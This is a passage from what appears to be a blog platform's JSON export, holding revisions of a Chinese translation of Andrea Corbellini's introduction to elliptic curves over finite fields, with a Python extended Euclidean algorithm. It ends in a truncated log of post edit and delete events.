这里也有一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-mul.html\\\">交互式工具</a>.\\n</p>\\n\\n<p>\\n   离散域 $\\\\mathbb{F}_p$ 上的椭圆曲线乘法有一个有趣的属性, 当已知曲线 $y^2 \\\\equiv x^3 + 2x + 3 \\\\pmod{97}$ 和 点 $P = (3, 6)$, 现在计算点 P 的(标量)乘积.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/cyclic-subgroup.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  点 $P = (3, 6)$ 的乘积总共只有 5 个点(0, P, 2P, 3P, 4P) 这些点不断循环出现. 容易看出椭圆曲线上的标量乘法和模运算加法是比较相似的.\\n</p>\"}],[\"markdown\",{\"markdown\":\"* 0P = 0\\n* 1P = (3, 6)\\n* 2P = (80, 10)\\n* 3P = (80, 87)\\n* 4P = (3, 91)\\n* 5P = 0\\n* 6P = (3, 6)\\n* 7P = (80, 10)\\n* 8P = (80, 87)\\n* 9P = (3, 91)\\n* ...\\n\\n我们马上可以发现两件事: 首先, P的乘积只有5个值, 曲线上其他任何点都没有出现. 其二, 这些点反复循环出现. 我们可以写成: \\n\\n* 5kP = 0\\n* (5k+1)P = P\\n* (5k+2)P = 2P\\n* (5k+3)P = 3P\\n* (5k+4)P = 4P\"}],[\"html\",{\"html\":\"<p>\\n  上面5个方程实际上还可以压缩成一个, 多亏有模运算: $kP = (k \\\\bmod{5})P$\\n</p>\\n\\n<p>\\n    不仅如此, 我们还可以验证到<strong>这五个点在加法运算下是封闭的</strong>. 这意味着: 无论我把 0, P, 2P, 3P, 4P 怎么加, 得到的结果总是这五个点之一. 再次强调, 椭圆曲线上其他任何的点都不会出现在结果中.\\n</p>\\n\\n<p>\\n  不仅仅是P = (3, 6)这个点, 上述规律对曲线上的任何点都是成立的. 当我们把 P 看做一个通用的点: \\n    $$\\n    nP + mP = \\\\underbrace{P + \\\\cdots + P}_{n\\\\ \\\\text{times}} + \\\\underbrace{P + \\\\cdots + P}_{m\\\\ \\\\text{times}} = (n + m)P\\n    $$\\n  这意味着, 如果我们将 P 的两个乘积相加, 将会得到 P 的另一个乘积 (P的乘积在加法运算下是封闭的). 这足以<a href=\\\"https://en.wikipedia.org/wiki/Subgroup#Basic_properties_of_subgroups\\\">证明</a><strong>P的乘积的集合是椭圆曲线群的一个循环子群.</strong>\\n</p>\\n\\n<p>\\n  \\\"子群\\\"是指另一个群的子集构成的群. 而\\\"循环子群\\\"是指群里的元素反复循环出现的子群, 正如前面的例子中所展示的. 点 P 则叫做这个循环子群的 <strong>生成点</strong>或<strong>基点</strong>.\\n</p>\\n\\n<p>\\n    循环子群是 ECC 以及其他密码学系统的基础, 在下一篇文章中我们将看到其中的原因.\\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[1,\"p\",[]]]}","created_at_ts":1577277545947,"created_at":"2019-12-25 12:39:06"},{"id":"5e0358782ee0ee0001819d43","post_id":"5e0067842ee0ee000181987b","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第二篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/23/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"这篇文章是[椭圆曲线密码学:入门](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)系列文章的第二篇.\\n\\n在[前一篇文章](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)中, 我们知道了如何在实数域上的椭圆曲线上定义一个群. 具体来说, 我们定义了[点加](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#group-law)的规则: 找到位于一条直线上的三个点, 三点之和为零($P + Q + R = 0$). 我们推导了求解点加的[几何方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#geometric-addition)与[代数方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#algebraic-addition).\\n\\n我们还介绍了[标量乘法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication)($nP = P + P + \\\\cdots + P$) 并且我们找到了一种用于计算标量乘法的\\\"简单\\\"算法: [倍加法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#double-and-add).\\n\\n**现在我们将要把椭圆曲线限制在有限域**而非所有实数的集合上, 让我们来看看这会产生怎样的变化.\"}],[\"markdown\",{\"markdown\":\"# 以p为模的整数域\"}],[\"html\",{\"html\":\"<p>\\n  有限域, 首先, 是指一个包含有限个元素的集合. 整数对质数p取模的集合就是有限域的一个例子, 一般用 $\\\\mathbb{Z}/p$, $GF(p)$ 或者 $\\\\mathbb{F}_p$ 表示. 这里我们采用最后一种表示方法.\\n</p>\\n\\n<p>\\n  在域上存在二元运算: 加法(+)和乘法(·), 他们都满足封闭性, 结合律和交换律. 对这两种操作都存在一个唯一的单位元, 并且对每个元素都有且仅有一个逆元. 最后, 乘法还满足分配率: $x \\\\cdot (y + z) = x \\\\cdot y + x \\\\cdot z$\\n</p>\\n\\n<p>\\n  这个集合由<strong>从0到p-1之间的所有整数构成<strong>. 加法和乘法遵循模运算法则(也叫\\\"时钟运算\\\"). 这里有一些在 $\\\\mathbb{F}_{23}$ 上运算的例子:\\n    \\n  <ul>\\n    <li> 加法: $(18 + 9) \\\\bmod{23} = 4$ </li>\\n    <li> 减法: $(7 - 14) \\\\bmod{23} = 16$ </li>\\n    <li> 乘法: $4 \\\\cdot 7 \\\\bmod{23} = 5$ </li>\\n    <li> \\n        加法逆运算: $-5 \\\\bmod{23} = 18$ <br>\\n        推导: $(5 + (-5)) \\\\bmod{23} = (5 + 18) \\\\bmod{23} = 0$\\n    </li>\\n    <li> \\n        乘法逆运算: $9^{-1} \\\\bmod{23} = 18$ <br>\\n        推导: $9 \\\\cdot 9^{-1} \\\\bmod{23} = 9 \\\\cdot 18 \\\\bmod{23} = 1$\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注:\\n  根据费马小定理可知, $9^{22} \\\\bmod{23} = 1$,\\n  所以 $9^{-1} \\\\bmod{23} = 9^{-1+22} \\\\bmod{23} = 18$\\n  这样理解起来要更容易一些\\n</pre>\\n    </li>\\n  </ul>\\n</p>\\n    \\n<p>\\n  如果这些等式看起来很陌生那么你需要先了解一点关于模运算的基本知识, 可以看看 [Khan Academy的这篇教程](https://www.khanacademy.org/computing/computer-science/cryptography/modarithmetic/a/what-is-modular-arithmetic)\\n</p>\\n    \\n<p>\\n    正如我们所言, 以p为模的整数是一个域, 它具备上述所有的特征. 需要注意的是p必须是一个质数! 以4为模的整数不是一个域: 2没有乘法逆元(等式 $2 \\\\cdot x \\\\bmod{4} = 1$ 没有解)\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 以p为模的除法运算\"}],[\"html\",{\"html\":\"<p>\\n  我们将会定义 $\\\\mathbb{F}_p$ 上的椭圆曲线, 但在那之前我们需要对 $\\\\mathbb{F}_p$ 上的 $x / y$ 表示什么意思有一个清晰的认识. 根据 $x / y = x \\\\cdot y^{-1}$, 或者简单的说, x 除以 y 等于 x 乘以 y 的乘法逆元. 这没什么好奇怪的, 不过它为我们提供了一种计算除法的基本方法: <strong> 找到这个数的乘法逆元再用计算乘法的方法在计算它 </strong>\\n</p>\\n\\n<p>\\n  借助<a href=\\\"https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95\\\">扩展欧几里得算法</a>计算乘法逆元是比较\\\"容易\\\"完成, 在最坏的情况下, 算法的复杂度为 $O(\\\\log p)$ (或者按位长来算, $O(k)$).\\n  我们不会详细讲解扩展的欧几里得算法, 因为这不是本文要讨论的, 不过这里有一份Python版的实现代码:\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n  扩展欧几里得算法 也叫 扩展的辗转相除法, \\n  该算法在译者的之前的博客 <a href=\\\"http://blog.chxj.name/understanding-rsa-algorithm/\\\">读跨越千年的RSA算法</a> 一文中曾有讲到, \\n  有兴趣的读者可以前往阅读\\n</pre>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef extended_euclidean_algorithm(a, b):\\n    \\\"\\\"\\\"\\n    Returns a three-tuple (gcd, x, y) such that\\n    a * x + b * y == gcd, where gcd is the greatest\\n    common divisor of a and b.\\n\\n    This function implements the extended Euclidean\\n    algorithm and runs in O(log b) in the worst case.\\n    \\\"\\\"\\\"\\n    s, old_s = 0, 1\\n    t, old_t = 1, 0\\n    r, old_r = b, a\\n\\n    while r != 0:\\n        quotient = old_r // r\\n        old_r, r = r, old_r - quotient * r\\n        old_s, s = s, old_s - quotient * s\\n        old_t, t = t, old_t - quotient * t\\n\\n    return old_r, old_s, old_t\\n\\n\\ndef inverse_of(n, p):\\n    \\\"\\\"\\\"\\n    Returns the multiplicative inverse of\\n    n modulo p.\\n\\n    This function returns an integer m such that\\n    (n * m) % p == 1.\\n    \\\"\\\"\\\"\\n    gcd, x, y = extended_euclidean_algorithm(n, p)\\n    assert (n * x + p * y) % p == gcd\\n\\n    if gcd != 1:\\n        # Either n is 0, or p is not a prime number.\\n        raise ValueError(\\n            '{} has no multiplicative inverse '\\n            'modulo {}'.format(n, p))\\n    else:\\n        return x % p\\n```\"}],[\"html\",{\"html\":\"<h1> $\\\\mathbb{F}_p$ 上的椭圆曲线 </h1>\"}],[\"html\",{\"html\":\"<p>\\n    现在, 我们已经掌握了将椭圆曲线限定在 $\\\\mathbb{F}_p$ 上所需的全部要素, 这些点的集合, 按前<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#elliptic-curves\\\">一篇文章</a>可以表示成: \\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in \\\\mathbb{R}^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 = x^3 + ax + b, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\ne 0\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    现在则应该写成:\\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in (\\\\mathbb{F}_p)^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 \\\\equiv x^3 + ax + b \\\\pmod{p}, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\not\\\\equiv 0 \\\\pmod{p}\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    0 仍然是无穷远处的点, 而 a 和 b 是 $\\\\mathbb{F}_p$ 上的两个整数.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/elliptic-curves-mod-p.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n以上是当 p = 19, 97, 127, 487 时, 曲线 $y^2 \\\\equiv x^3 - 7x + 10 \\\\pmod{p}$ 的图形. 注意, 在每个 x 坐标上最多有2个点, 且整个图形关于 $y = p / 2$ 水平对称.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singular-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n 曲线 $y^2 \\\\equiv x^3 \\\\pmod{29}$ 是奇异的并且在有三个点落在 (0,0) 上. 这样的曲线就不是有效的椭圆曲线\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n之前连续的曲线现在变成了xy平面上一些离散的点的集合. 然而我们还是能证明, 即使我们限制了曲线的域, <strong>这个在 $\\\\mathbb{F}_p$ 上的椭圆曲线仍然是一个阿贝尔群</strong>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 点加\"}],[\"html\",{\"html\":\"<p>\\n显然, 为了让加法在 $\\\\mathbb{F}_p$ 上仍然有效, 我们需要稍微调整一下定义. 在实数域上, 我们说位于一条直线上的三点之和为0($P + Q + R = 0$). 我们可以保留这个定义, 但是在 $\\\\mathbb{F}_p$ 上三点连成一线是什么意思呢?\\n</p>\\n\\n<p>\\n    我们说<strong>当有一条直线能将三个点连起来时, 三点就位于一条直线上.</strong> 当然, $\\\\mathbb{F}_p$(有限域)上的直线和$\\\\mathbb{R}$(实数域)上的直线是不一样的. 通俗的说, $\\\\mathbb{F}_p$ 上的直线是指满足方程 $ax + by + c \\\\equiv 0 \\\\pmod{p}$ 的所有点 $(x, y)$ 的集合(即加上 \\\"$(\\\\text{mod}\\\\ p)$\\\" 的标准直线方程).\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  上图为曲线 $y^2 \\\\equiv x^3 - x + 3 \\\\pmod{127}$ 上 点$P = (16, 20)$ 和 点$Q = (41, 120)$ 的加法. 看看直线$y \\\\equiv 4x + 83 \\\\pmod{127}$是如何通过在平面上不断\\\"重复\\\"出现将这些点连接起来的.\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n   既然我们在一个群里, 那么点加就具有以下这些我们已知的属性: \\n  <ul>\\n    <li> $Q + 0 = 0 + Q = Q$ (根据单位元的定义可得) </li>\\n    <li> 已知一个非零点 Q , 其逆元 -Q 将具有与之相同的横坐标和相反的纵坐标. 或者, 也可以表示成 $-Q = (x_Q, -y_Q \\\\bmod{p})$. 例如, $\\\\mathbb{F}_{29}$ 上的曲线上有一点 Q = (2, 5), 该点的逆元 $-Q = (2, -5 \\\\bmod{29}) = (2, 24)$ </li>\\n    <li> 还有, $P + (-P) = 0$ (根据逆元的定义) </li>\\n  </ul>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 代数求和\"}],[\"html\",{\"html\":\"<p>\\n    这里计算点加的方程与在前一篇文章里讲的完全一样, 除了我们需要再每个方程末尾加上 $\\\\text{mod}\\\\ p$. 所以, 已知 $P = (x_P, y_P)$, $Q = (x_Q, y_Q)$ 和 $R = (x_R, y_R)$, 我们可以通过以下方法计算 $P + Q = -R$:\\n    $$\\n    \\\\begin{array}{rcl}\\n  x_R & = & (m^2 - x_P - x_Q) \\\\bmod{p} \\\\\\\\\\n  y_R & = & [y_P + m(x_R - x_P)] \\\\bmod{p} \\\\\\\\\\n  & = & [y_Q + m(x_R - x_Q)] \\\\bmod{p}\\n\\\\end{array}\\n    $$\\n    当 $P \\\\ne Q$, 斜率 m 可以表示为:\\n    $$ m = (y_P - y_Q)(x_P - x_Q)^{-1} \\\\bmod{p} $$\\n    而当 $P = Q$, 可得: \\n    $$ m = (3 x_P^2 + a)(2 y_P)^{-1} \\\\bmod{p} $$\\n</p>\\n\\n<p>\\n  上面的方程没有任何变化并非是一个巧合: 事实上, 这些方程在任何域下都是成立的, 无论是有限域还是非有限域(需要排除$\\\\mathbb{F}_2$ 和 $\\\\mathbb{F}_3$ 这两种特殊情况). 我似乎应该为这个说法提供一些依据, 不过问题在于: 关于群论的证明总会涉及到各种复杂的数学概念. 不过, 我还是找到了一个只使用初等数学概念推导论证的<a href=\\\"https://www.uni-regensburg.de/Fakultaeten/nat_Fak_I/friedl/papers/elliptic_2017.pdf\\\">来自Stefan Friedl的证明</a>. 如果你对为什么这些方程在(几乎)所有域中都能成立感兴趣的话可以前往阅读.\\n</p>\\n\\n<p>\\n    回到我们的话题, 我们不会定义一个几何意义的方法了: 事实上这会比较麻烦. 比如说, 在前一篇文章中我们说要计算 $P + P$ 需要在曲线上做一条过 P 点的切线. 但如果曲线不是连续的, \\\"切线\\\"这个词是没有意义的. 我们可以深入研究这个问题,不过这种几何式的方法确实太复杂和难以实践了.\\n</p>\\n\\n<p>\\n   不过, 你可以试试这个计算点加的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-add.html\\\">交互式小工具</a>.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线群的阶\"}],[\"html\",{\"html\":\"<p>\\n  我们说有限域上的椭圆曲线由有限个点组成. 那么我们需要回答一个重要的问题: 到底有多少个点呢?\\n</p>\\n\\n<p>\\n    首先, 我们说群里点的数量叫做这个群的阶.\\n</p>\\n\\n<p>\\n    从 0 到 p-1 逐个尝试所有可能的值显然是不切实际的, 这样需要经过 $O(p^2)$ 次尝试, 如果 p 是一个非常大的质数, 这样做的将会很\\\"困难\\\".\\n</p>\\n\\n<p>\\n   幸好, 我们还有一种更快的算法来计算群的阶: <a href=\\\"https://en.wikipedia.org/wiki/Schoof%27s_algorithm\\\">Schoof's 算法</a>. 我们不会深入介绍这个算法的细节 -- 我们只需要知道, 这个算法的时间复杂度为多项式级别.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法和循环子群\"}],[\"html\",{\"html\":\"<p>\\n    在实数域中, 乘法可以通过如下方式定义: \\n    $$\\n    n P = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n    然后, 我们可以通过<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication\\\">倍加法</a>通过 $O(\\\\log n)$ 步(或者  $O(k)$, k为数字的位长)得出结果. 这里也有一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-mul.html\\\">交互式工具</a>.\\n</p>\\n\\n<p>\\n   离散域 $\\\\mathbb{F}_p$ 上的椭圆曲线乘法有一个有趣的属性, 当已知曲线 $y^2 \\\\equiv x^3 + 2x + 3 \\\\pmod{97}$ 和 点 $P = (3, 6)$, 现在计算点 P 的(标量)乘积.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/cyclic-subgroup.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  点 $P = (3, 6)$ 的乘积总共只有 5 个点(0, P, 2P, 3P, 4P) 这些点不断循环出现. 容易看出椭圆曲线上的标量乘法和模运算加法是比较相似的.\\n</p>\"}],[\"markdown\",{\"markdown\":\"* 0P = 0\\n* 1P = (3, 6)\\n* 2P = (80, 10)\\n* 3P = (80, 87)\\n* 4P = (3, 91)\\n* 5P = 0\\n* 6P = (3, 6)\\n* 7P = (80, 10)\\n* 8P = (80, 87)\\n* 9P = (3, 91)\\n* ...\\n\\n我们马上可以发现两件事: 首先, P的乘积只有5个值, 曲线上其他任何点都没有出现. 其二, 这些点反复循环出现. 我们可以写成: \\n\\n* 5kP = 0\\n* (5k+1)P = P\\n* (5k+2)P = 2P\\n* (5k+3)P = 3P\\n* (5k+4)P = 4P\"}],[\"html\",{\"html\":\"<p>\\n  上面5个方程实际上还可以压缩成一个, 多亏有模运算: $kP = (k \\\\bmod{5})P$\\n</p>\\n\\n<p>\\n    不仅如此, 我们还可以验证到<strong>这五个点在加法运算下是封闭的</strong>. 这意味着: 无论我把 0, P, 2P, 3P, 4P 怎么加, 得到的结果总是这五个点之一. 再次强调, 椭圆曲线上其他任何的点都不会出现在结果中.\\n</p>\\n\\n<p>\\n  不仅仅是P = (3, 6)这个点, 上述规律对曲线上的任何点都是成立的. 当我们把 P 看做一个通用的点: \\n    $$\\n    nP + mP = \\\\underbrace{P + \\\\cdots + P}_{n\\\\ \\\\text{times}} + \\\\underbrace{P + \\\\cdots + P}_{m\\\\ \\\\text{times}} = (n + m)P\\n    $$\\n  这意味着, 如果我们将 P 的两个乘积相加, 将会得到 P 的另一个乘积 (P的乘积在加法运算下是封闭的). 这足以<a href=\\\"https://en.wikipedia.org/wiki/Subgroup#Basic_properties_of_subgroups\\\">证明</a><strong>P的乘积的集合是椭圆曲线群的一个循环子群.</strong>\\n</p>\\n\\n<p>\\n  \\\"子群\\\"是指另一个群的子集构成的群. 而\\\"循环子群\\\"是指群里的元素反复循环出现的子群, 正如前面的例子中所展示的. 点 P 则叫做这个循环子群的 <strong>生成点</strong>或<strong>基点</strong>.\\n</p>\\n\\n<p>\\n    循环子群是 ECC 以及其他密码学系统的基础, 在下一篇文章中我们将看到其中的原因.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 子群的阶\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[10,30],[1,\"p\",[]]]}","created_at_ts":1577277560876,"created_at":"2019-12-25 12:39:20"}],"members":[],"actions":[{"id":"5cfa08ef31767300013e0eea","resource_id":"5cfa062dc6743100012792f4","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-06-07 06:49:19"},{"id":"5cfa08fa31767300013e0eeb","resource_id":"5cfa062dc6743100012792f2","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-06-07 06:49:30"},{"id":"5cfa090331767300013e0eec","resource_id":"5cfa062dc6743100012792f2","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-06-07 06:49:39"},{"id":"5cfa090731767300013e0eed","resource_id":"5cfa062dc6743100012792f2","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-06-07 06:49:43"},{"id":"5cfa091531767300013e0eee","resource_id":"5cfa062dc6743100012792f0","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-06-07 06:49:57"},{"id":"5cfa091f31767300013e0eef","resource_id":"5cfa062dc6743100012792ee","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-06-07 06:50:07"},{"id":"5cfa092831767300013e0ef0","resource_id":"5cfa062dc6743100012792ec","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-06-07 06:50:16"},{"id":"5cfa093231767300013e0ef1","resource_id":"5cfa062cc6743100012792e8","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-06-07 06:50:26"},{"id":"5cfa094531767300013e0ef2","resource_id":"5cfa062dc6743100012792ea","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-06-07 06:50:45"},{"id":"5cfa095931767300013e0ef3","resource_id":"5cfa089b31767300013e0e55","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2019-06-07 06:51:05"},{"id":"5d6a28903faccd0001d04ecb","resource_id":"5cfa062cc6743100012792e8","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2019-08-31 07:58:08"},{"id":"5d6a28903faccd0001d04ecc","resource_id":"5cfa062dc6743100012792ea","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2019-08-31 07:58:08"},{"id":"5d6a28903faccd0001d04ecd","resource_id":"5cfa062dc6743100012792ec","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2019-08-31 07:58:08"},{"id":"5d6a28903faccd0001d04ece","resource_id":"5cfa062dc6743100012792ee","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2019-08-31 07:58:08"},{"id":"5d6a28903faccd0001d04ecf","resource_id":"5cfa062dc6743100012792f0","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2019-08-31 07:58:08"},{"id":"5d6a28903faccd0001d04ed0","resource_id":"5cfa062dc6743100012792f2","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2019-08-31 07:58:08"},{"id":"5d6a28903faccd0001d04ed1","resource_id":"5cfa062dc6743100012792f4","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2019-08-31 07:58:08"},{"id":"5d6a289d3faccd0001d04ed2","resource_id":"5cfa089b31767300013e0e74","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-08-31 07:58:21"},{"id":"5d6a28ad3faccd0001d04ed3","resource_id":"5cfa089b31767300013e0e73","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-08-31 07:58:37"},{"id":"5d6a28db3faccd0001d04ed4","resource_id":"5cfa089b31767300013e0e67","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2019-08-31 07:59:23"},{"id":"5d6a28fc3faccd0001d04ed5","resource_id":"5cfa089b31767300013e0e73","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2019-08-31 07:59:56"},{"id":"5d6a291e3faccd0001d04ed6","resource_id":"5cfa089b31767300013e0e74","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2019-08-31 08:00:30"},{"id":"5d6a292d3faccd0001d04ed7","resource_id":"5cfa089b31767300013e0e64","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2019-08-31 08:00:45"},{"id":"5d6a2d3e3faccd0001d04ed8","resource_id":"5cfa089b31767300013e0e86","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2019-08-31 08:18:06"},{"id":"5d6a39223faccd0001d04ed9","resource_id":"5cfa089b31767300013e0e84","resource_type":"post","actor_id":"1","actor_type":"user","event":"deleted","context":null,"created_at":"2019-08-31 09:08:50"},{"id":"5d6a392b3faccd0001d04eda","resource_id":"5cfa089b31767300013e0e85","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-08-31 09:08:59"},{"id":"5d6a399f3faccd0001d04edd","resource_id":"5cfa089b31767300013e0e85","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-08-31 09:10:55"},{"id":"5d6a39a53faccd0001d04edf","resource_id":"5cfa089b31767300013e0e85","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-08-31 09:11:01"},{"id":"5d6a39ae3faccd0001d04ee1","resource_id":"5cfa089b31767300013e0e85","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-08-31 09:11:10"},{"id":"5d6a39c43faccd0001d04ee2","resource_id":"5cfa089b31767300013e0e85","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-08-31 09:11:32"},{"id":"5d6a39d13faccd0001d04ee4","resource_id":"5cfa089b31767300013e0e85","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-08-31 09:11:45"},{"id":"5d6a3ad53faccd0001d04ee6","resource_id":"5cfa089b31767300013e0e85","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-08-31 09:16:05"},{"id":"5d6a3ada3faccd0001d04ee8","resource_id":"5cfa089b31767300013e0e85","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-08-31 09:16:10"},{"id":"5d6a3aeb3faccd0001d04eea","resource_id":"5cfa089b31767300013e0e85","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-08-31 09:16:27"},{"id":"5d6a3af53faccd0001d04eec","resource_id":"5cfa089b31767300013e0e85","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-08-31 09:16:37"},{"id":"5d6a3afc3faccd0001d04eee","resource_id":"5cfa089b31767300013e0e85","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-08-31 09:16:44"},{"id":"5d6a3b0f3faccd0001d04ef0","resource_id":"5cfa089b31767300013e0e85","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-08-31 09:17:03"},{"id":"5d6a3b1e3faccd0001d04ef2","resource_id":"5cfa089b31767300013e0e85","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-08-31 09:17:18"},{"id":"5d6a3b683faccd0001d04ef4","resource_id":"5cfa089b31767300013e0e85","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-08-31 09:18:32"},{"id":"5d6a3b773faccd0001d04ef6","resource_id":"5cfa089b31767300013e0e85","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-08-31 09:18:47"},{"id":"5d6a3b7f3faccd0001d04ef8","resource_id":"5cfa089b31767300013e0e85","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-08-31 